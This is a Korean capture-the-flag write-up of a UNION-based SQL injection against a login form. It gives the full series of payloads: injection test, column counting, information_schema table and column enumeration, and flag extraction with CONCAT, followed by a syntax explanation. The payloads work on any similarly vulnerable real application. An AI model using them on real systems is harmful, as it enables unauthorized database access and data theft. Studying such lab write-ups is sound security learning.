---
title: "Baby-union (DH, S4)"
date: 2026-07-07
draft: false
tags: ["SQL Injection"]
ShowToc: true
---

## TL;DR
- 취약점: 로그인 쿼리가 입력을 문자열로 이어붙임 — `SELECT * FROM users WHERE uid='{uid}' and upw='{upw}'` → SQL Injection. 결과가 표로 렌더되어 in-band.
- 트릭: flag가 로그인 테이블 밖(`onlyflag`)에 있음 → UNION으로 추출. 테이블·컬럼 이름이 숨겨져 있어 information_schema로 열거.
- 페이로드: `' UNION SELECT 1,CONCAT(sname,svalue,sflag,sclose),3,4 FROM onlyflag-- -`

## 흐름
| 경로 | 입력 | 통제주체 | 역할 |
|---|---|---|---|
| / | uid, upw (POST form) | 공격자 | 로그인 쿼리 → 결과를 표로 렌더 → sink |

결과가 화면에 그대로 표시(in-band)라 UNION 추출이 가능한 조건이다.

## 익스플로잇
1. 주입 확인: uid에 `'` 하나 → 쿼리 깨져 500 → 주입구 살아있음.
2. 컬럼 수·출력 위치: `' UNION SELECT 1,2,3,4-- -` → 에러 없이 뜨고 화면엔 2·4번만 표시 → 컬럼은 4개, 출력 위치는 2·4번.
3. 테이블 이름 열거: `' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -` → `users,onlyflag`.
4. 컬럼 이름 열거: `' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='onlyflag'-- -` → `idx,sname,svalue,sflag,sclose`.
5. flag 추출: `' UNION SELECT 1,CONCAT(sname,svalue,sflag,sclose),3,4 FROM onlyflag-- -` → 2번 칸에 flag.
- 제출: POST / (form의 uid) | 회수: 응답 표의 "id" 칸(= 2번 컬럼)

## 페이로드 문법 뜯어보기
왜 저렇게 생겼는지 조각별로.

따옴표 탈출 + 주석
내 입력은 `uid='...'` 안에 갇혀 있다. 맨 앞 `'`로 그 문자열을 닫고 밖으로 나온 뒤, 뒤에 남는 `' and upw='...'`를 `-- -`로 주석 처리해 무력화한다. `-- -`는 MySQL 주석 `-- `(공백 필수) 뒤에 문자를 하나 더 붙인 것으로, 끝 공백이 전송 중 잘려도 주석이 살아남게 하는 관용구다.

UNION SELECT
두 SELECT의 결과 행을 세로로 이어붙이는 문법. 유일한 규칙은 양쪽 컬럼 수가 같아야 한다는 것이다. 원래 쿼리가 4컬럼이면 `UNION SELECT`도 값 4개(`1,2,3,4`)를 줘야 한다. 여기서 숫자는 두 역할을 한다 — 컬럼 수를 맞추는 자리채움이자, 어느 자리가 화면에 뜨는지 확인하는 표식.

information_schema
DB가 자기 구조(테이블·컬럼 목록)를 담아두는 표준 메타 DB. 어느 MySQL에나 기본으로 있다.
- `information_schema.tables` : 모든 테이블 목록. `WHERE table_schema=database()`로 현재 DB 것만 추린다. `database()`는 현재 DB 이름을 돌려주는 함수.
- `information_schema.columns` : 모든 컬럼 목록. `WHERE table_name='onlyflag'`로 그 테이블의 컬럼만 추린다.

group_concat vs CONCAT (제일 헷갈리는 부분)
- `group_concat(x)` : 여러 "행"의 x를 콤마로 이어 하나의 문자열로 만든다. 테이블이나 컬럼은 여러 개(= 행이 여럿)인데 출력 칸은 하나뿐이라, 다 몰아 보려고 쓴다.
- `CONCAT(a,b,c)` : 한 "행"의 여러 컬럼을 하나로 이어붙인다. flag가 여러 컬럼에 쪼개져 있을 때 한 칸에 합쳐 보려고 쓴다.
- 한 줄 요약 — 세로(여러 행)를 합치면 group_concat, 가로(한 행의 여러 컬럼)를 합치면 CONCAT.

왜 하필 2번 자리인가
2단계에서 화면에 뜨는 게 2·4번 컬럼임을 확인했다. 그래서 캐낸 값을 반드시 그 위치에 놓아야 보인다. 1·3번에 놓으면 쿼리는 실행돼도 화면엔 안 나온다.

## 함정 & 판별점
- 삽질: 제공된 init.sql의 `fake_table_name`·`fake_col*`은 이름부터 가짜라 서버엔 없어서 500. 배포 파일은 flag뿐 아니라 스키마 이름도 placeholder일 수 있다 → 실제 이름은 반드시 information_schema로 확인. 그리고 `-- ` 주석의 끝 공백이 전송 중 잘려 실패 → `-- -`로 해결.
- 판별점: 결과가 화면에 보이고(in-band) flag가 다른 테이블에 있으면 UNION. 스키마를 모르면 information_schema로 테이블 → 컬럼 → 값 순으로 열거. 출력 위치는 `UNION SELECT 1,2,3,4`로 먼저 찾는다.